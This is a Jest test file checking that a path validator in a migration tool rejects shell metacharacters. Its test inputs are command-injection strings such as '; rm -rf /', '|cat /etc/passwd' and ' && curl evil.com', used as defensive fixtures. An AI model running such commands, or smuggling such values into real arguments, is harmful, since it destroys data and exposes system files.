import { describe, test, expect, beforeAll, afterAll } from '@jest/globals';
import { join } from 'node:path';
import { mkdirSync, rmSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { validateRootDirectory } from '../src/migration-process/legacy-helpers.js';

describe('Path Validation Security', () => {
    const testRoot = join(tmpdir(), 'fiori-migration-test-' + Date.now());

    beforeAll(() => {
        mkdirSync(testRoot, { recursive: true });
    });

    afterAll(() => {
        rmSync(testRoot, { recursive: true, force: true });
    });

    describe('Shell metacharacter rejection', () => {
        test('should reject paths with backticks', () => {
            const maliciousPath = testRoot + '`whoami`';
            expect(() => validateRootDirectory(maliciousPath)).toThrow('Path contains unsafe characters');
        });

        test('should reject paths with dollar signs', () => {
            const maliciousPath = testRoot + '$(whoami)';
            expect(() => validateRootDirectory(maliciousPath)).toThrow('Path contains unsafe characters');
        });

        test('should reject paths with pipes', () => {
            const maliciousPath = testRoot + '|cat /etc/passwd';
            expect(() => validateRootDirectory(maliciousPath)).toThrow('Path contains unsafe characters');
        });

        test('should reject paths with semicolons', () => {
            const maliciousPath = testRoot + '; rm -rf /';
            expect(() => validateRootDirectory(maliciousPath)).toThrow('Path contains unsafe characters');
        });

        test('should reject paths with ampersands', () => {
            const maliciousPath = testRoot + ' && curl evil.com';
            expect(() => validateRootDirectory(maliciousPath)).toThrow('Path contains unsafe characters');
        });

        test('should reject paths with redirects', () => {
            const maliciousPath = testRoot + ' > /tmp/evil';
            expect(() => validateRootDirectory(maliciousPath)).toThrow('Path contains unsafe characters');
        });

        test('should reject paths with null bytes', () => {
            const maliciousPath = testRoot + '\0';
            expect(() => validateRootDirectory(maliciousPath)).toThrow('Path contains unsafe characters');
        });

        test('should reject paths with newlines', () => {
            const maliciousPath = testRoot + '\nrm -rf /';
            expect(() => validateRootDirectory(maliciousPath)).toThrow('Path contains unsafe characters');
        });

        test('should accept normal project paths', () => {
            expect(() => validateRootDirectory(testRoot)).not.toThrow();
            const validated = validateRootDirectory(testRoot);
            expect(validated).toBeTruthy();
        });

        test('should accept paths with spaces, dashes, underscores', () => {
            const validPath = join(testRoot, 'my-project_v2 (copy)');
            mkdirSync(validPath, { recursive: true });

            expect(() => validateRootDirectory(validPath)).not.toThrow();
            const validated = validateRootDirectory(validPath);
            expect(validated).toBeTruthy();
        });
    });

    describe('Non-existent directory handling', () => {
        test('should reject non-existent root directory', () => {
            const nonExistentPath = join(testRoot, 'does-not-exist-' + Date.now());
            expect(() => validateRootDirectory(nonExistentPath)).toThrow('Root directory does not exist');
        });
    });
});
